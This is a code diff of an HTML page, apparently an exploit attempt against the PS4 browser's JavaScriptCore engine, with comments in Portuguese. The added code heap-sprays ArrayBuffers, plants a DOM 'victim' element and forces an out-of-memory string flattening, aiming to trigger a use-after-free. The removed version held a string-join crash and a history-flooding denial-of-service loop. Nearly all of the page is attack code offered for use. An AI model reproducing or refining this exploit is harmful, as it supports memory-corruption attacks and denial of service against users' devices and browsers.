@@ -2,66 +2,96 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 JSC Heap Crash</title>
+    <title>PS4 OOM -> UAF Trigger</title>
     <style>
-        body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; text-align: left; }
+        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
         button { 
-            background: #fff; color: #000; border: none; padding: 15px; 
-            width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 10px;
+            background: #222; color: #fff; border: 2px solid #0f0; 
+            padding: 20px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer;
         }
-        #log { border: 1px solid #555; padding: 10px; margin-top: 20px; min-height: 100px; }
+        #log { border: 1px solid #0f0; padding: 10px; margin-top: 20px; height: 300px; overflow-y: scroll; }
     </style>
 </head>
 <body>
-    <h1>JavaScriptCore String Stress</h1>
-    <p>Target: Force contiguous memory allocation (Bypass Lazy Alloc).</p>
 
-    <button onclick="runStringAttack()">TEST: STRING FLATTENING (CRASH)</button>
-    
-    <div id="log">Status: Aguardando...</div>
+    <h1>HEAP GROOMING + OOM TRIGGER</h1>
+    <p>Target: Force GC Panic inside String::flatten()</p>
+
+    <button onclick="runExploit()">FIRE EXPLOIT (SPRAY + FLATTEN)</button>
+    <div id="log">Status: Idle.</div>
 
     <script>
+        var pressure = [];
+        var bufs = [];
+        var victim = null;
+
         function log(msg) { 
-            document.getElementById('log').innerText += "\n" + msg; 
+            document.getElementById('log').innerText += `[${new Date().toLocaleTimeString()}] ${msg}\n`; 
         }
 
-        function runStringAttack() {
-            log("Fase 1: Criando Array Fragmentado...");
+        function runExploit() {
+            log("STEP 1: Heap Spray (Preenchendo a memória)...");
             
+            // 1. Spray Básico para fragmentar e alinhar
+            // Usamos ArrayBuffers pois são alocados fora da heap JS principal (mmap)
+            // Isso aperta a memória do sistema operacional
             setTimeout(() => {
                 try {
-                    // Cria um array com milhares de strings de 10MB cada
-                    // Isso fragmenta a Heap rapidamente
-                    var hugeArray = [];
-                    var chunk = new Array(1024 * 1024).join("A"); // ~1MB String
-                    
-                    for(let i=0; i < 2000; i++) {
-                        hugeArray.push(chunk);
-                        if(i % 200 === 0) log("Alocado: " + i + "MB");
+                    for (let i = 0; i < 10000; i++) {
+                        let buf = new ArrayBuffer(16384); // 16KB blocks
+                        bufs.push(buf);
                     }
+                    log("Heap Base preparada (~160MB).");
+                } catch(e) {}
+                
+                // 2. Criar a Vítima (Objeto com destrutor complexo)
+                // Usamos div com listeners, pois envolve C++ e JS
+                victim = document.createElement('div');
+                victim.id = "target";
+                document.body.appendChild(victim);
+                victim.addEventListener('click', () => { console.log('alive'); });
 
-                    log("Fase 2: O ACHATAMENTO (The Flattening)...");
-                    log("Atenção: O navegador deve travar agora.");
-
-                    // O GOLPE FINAL:
-                    // .join('') força o WebKit a pegar todas as peças espalhadas
-                    // e tentar colocá-las num bloco ÚNICO e GIGANTE de memória.
-                    // A maioria dos sistemas não tem um bloco contínuo desse tamanho livre.
-                    var flatString = hugeArray.join("");
-                    
-                    // Se sobreviveu, vamos tentar manipular para garantir que a memória foi escrita
-                    log("Tamanho final: " + flatString.length);
-                    var upper = flatString.toUpperCase(); // Força cópia (2x memória)
-                    
-                } catch(e) {
-                    log("Erro (Browser Protegeu): " + e.message);
-                    log("Tentando Loop Infinito de Histórico como 'Plano B'...");
-                    
-                    // Plano B: History Flooding (Trava a UI do sistema)
-                    for(let i=0; i<100000; i++) {
-                        history.pushState(0,0, i.toString());
-                    }
+                // 3. Preparar a "Bomba" (String Flattening)
+                // Usamos cons-strings (lazy) que não ocupam RAM real ainda
+                log("STEP 2: Preparando Cons-Strings...");
+                var chunk = new Array(1024 * 1024).join("A"); // 1MB String representation
+                for(let i=0; i < 1000; i++) {
+                    pressure.push(chunk);
                 }
+
+                log("STEP 3: O GOLPE FINAL (Trigger OOM)...");
+                log("Se o console desligar ou der erro de sistema, é UAF.");
+
+                setTimeout(() => {
+                    // Tenta liberar a vítima NO MEIO do pânico de memória
+                    // Se o tratamento de erro do OOM for falho, ele pode liberar 'victim'
+                    // mas o JS ainda ter uma referência a ele.
+                    
+                    try {
+                        // O Gatilho de Alocação Gigante
+                        var flat = pressure.join(""); 
+                        
+                        // --- ZONA DE PERIGO ---
+                        // Se o código chegou aqui, o OOM falhou em matar o script.
+                        // Verificamos se a vítima foi corrompida.
+                        if (victim) {
+                            victim.innerHTML = "SURVIVED";
+                            // Tenta acessar propriedades para ver se causa SegFault
+                            let x = victim.attributes[0].name; 
+                        }
+                    } catch(e) {
+                        // OOM Exception capturada. O GC deve ter rodado loucamente.
+                        log("OOM Capturado! Verificando corrupção...");
+                        
+                        // Race Condition Check:
+                        // O GC pode ter coletado 'victim' para tentar abrir espaço para a String
+                        // Mas nós ainda temos a variável 'victim'.
+                        if (victim) {
+                            victim.innerText = "CHECKING UAF"; // Crash aqui se UAF
+                        }
+                    }
+                }, 100);
+
             }, 100);
         }
     </script>
